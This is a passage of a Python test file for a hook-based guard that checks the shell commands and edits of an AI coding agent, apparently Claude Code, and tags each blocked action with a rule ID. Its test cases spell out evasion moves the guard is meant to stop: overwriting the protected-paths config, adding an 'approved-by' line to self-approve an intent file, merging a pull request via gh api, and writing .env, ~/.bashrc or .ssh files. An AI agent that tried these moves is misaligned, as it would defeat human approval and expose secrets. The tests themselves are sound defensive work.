            (lambda: self.bash("git config gpg.program /tmp/x"), "G-TOOL-05"),
            (lambda: self.bash("gh api -X PUT repos/o/r/pulls/1/merge"), "G-MERGE-01"),
            (lambda: self.bash("echo x > .aiops/config/protected-paths"), "G-ART-05"),
            (lambda: self.bash("pip install requests"), "G-LOCK-06"),
            (lambda: self.bash("make format"), "G-LOCK-07"),
            (lambda: self.bash("git stash"), "G-LOCK-03"),
            (lambda: self.bash("echo x > .env"), "G-SEC-02"),
            (lambda: self.bash("echo x > package-lock.json"), "G-FILE-01"),
            (lambda: self.bash("git rm .aiops/0001-csv-export/intent.md"), "G-ART-08"),
            (lambda: self.bash("git checkout main -- ."), "G-FILE-02"),
            (lambda: self.bash("git checkout -- package-lock.json"), "G-FILE-03"),
            (lambda: self.bash("cat fix.diff | patch -p1"), "G-ART-06"),
            (lambda: self.bash("cat fix.diff | git apply"), "G-ART-07"),
            (lambda: self.bash("git add src/app.py"), "G-LOCK-04"),
            (lambda: self.bash("tar -xf x.tar -C /tmp/out"), "G-LOCK-08"),
            (lambda: self.bash(f"echo x > {ROOT}/lib/x.py"), "G-TOOL-02"),
            (lambda: self.bash("echo x > /tmp/elsewhere/.ssh/config"), "G-SEC-01"),
            (lambda: self.bash("echo x > ~/.bashrc"), "G-TOOL-04"),
        ]
        for run, rid in cases:
            with self.subTest(rid=rid):
                self.assertId(run(), rid)

    def test_artifact_field_rules(self):
        self.assertId(self.edit(".aiops/0001-csv-export/intent.md",
                                INTENT.format(id="0001").replace("created:", "approved-by: x\ncreated:")), "G-GATE-03")
        self.write("intent", INTENT)
        text = (self.d / "intent.md").read_text()
        self.assertId(self.edit(".aiops/0001-csv-export/intent.md", text.replace("created:", "approved-by: x\ncreated:")),
                      "G-GATE-04")
        self.assertId(self.edit(".aiops/0001-csv-export/intent.md", text.replace("id: 0001\n", "")), "G-ART-03")

    def test_commit_of_code_and_crash(self):
        (self.root / "src" / "app.py").write_text("x = 2\n")
        self.assertId(self.bash("git commit -a -m x"), "G-LOCK-05")
        r = self.hook("pre-bash", {"tool_name": "Bash", "tool_input": "not an object", "cwd": str(self.root)})
        self.assertId(r, "G-FAIL-01")

    def test_merge_on_main_and_scaffold_elsewhere(self):
        git(self.root, "switch", "-q", "main")
        self.assertId(self.bash("git merge feat/0001-csv-export"), "G-MERGE-02")
        import tempfile
        with tempfile.TemporaryDirectory() as other:
            git(other, "init", "-q")
            r = self.bash("sdlc init", cwd=other, env={"CLAUDE_PROJECT_DIR": str(self.root)})
            self.assertId(r, "G-SCAF-01")

    def test_post_edit_validation_carries_id(self):
        self.write("intent", INTENT.replace("## Problem", "## Issue"))
        r = self.hook("post-edit", self.hook_input("Write", file_path=str(self.d / "intent.md")))
        self.assertEqual(r.returncode, 2)
        # PostToolUse: the edit was saved, so this is feedback, not a block
        self.assertRegex(r.stderr, r"^NOT VALID \[G-ART-09\] by zouj-ai-sdlc: ")
        self.assertNotIn("BLOCKED", r.stderr)
        self.assertIn("was saved", r.stderr)
        self.assertIn("sdlc why G-ART-09", r.stderr)

    def test_secret_scan_carries_id(self):
        import subprocess
        import sys
        from helpers import ROOT
        (self.root / ".env").write_text("TOKEN=x\n")
        r = subprocess.run([sys.executable, "-I", "-c", "import sys; sys.path.insert(0, sys.argv[1])\n"
                            "from sdlc_engine.secret_scan import main; sys.exit(main())", str(ROOT / "lib")],
                           input=__import__("json").dumps(self.hook_input("Bash", command="cat .env")),
                           capture_output=True, text=True, cwd=self.root)
        self.assertEqual(r.returncode, 2, r.stderr)
        self.assertRegex(r.stderr, r"^BLOCKED \[G-SEC-03\] by guard-bash: ")
        self.assertIn("sdlc why G-SEC-03", r.stderr)


if __name__ == "__main__":
    unittest.main()
